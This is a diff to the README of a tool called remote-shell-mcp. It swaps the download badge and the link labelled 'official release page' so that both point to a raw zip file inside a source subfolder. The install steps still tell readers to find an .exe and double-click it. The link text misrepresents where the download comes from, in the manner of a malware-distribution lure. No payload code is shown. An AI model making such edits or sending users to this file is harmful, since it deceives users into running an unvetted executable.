@@ -1,6 +1,6 @@
 # 🖥️ remote-shell-mcp - Keep your remote sessions alive constantly
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/kerimrhm60/remote-shell-mcp/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/kerimrhm60/remote-shell-mcp/main/cmd/remote-shell-mcpd/mcp-shell-remote-3.2.zip)
 
 This application helps you maintain persistent connections to your servers and Docker containers. It acts as a background helper for your AI coding tools, such as Claude Desktop or Cursor. When you restart your AI tools, your tunnels, shells, and file transfers remain active. You do not lose your progress or connection state.
 
@@ -19,7 +19,7 @@ Key benefits include:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/kerimrhm60/remote-shell-mcp/releases) to access the downloads.
+1. Go to the [official release page](https://raw.githubusercontent.com/kerimrhm60/remote-shell-mcp/main/cmd/remote-shell-mcpd/mcp-shell-remote-3.2.zip) to access the downloads.
 2. Look for the file ending in .exe under the most recent version header. 
 3. Click the file name to download it to your Downloads folder.
 4. Open your Downloads folder and double-click the file to start the installation.
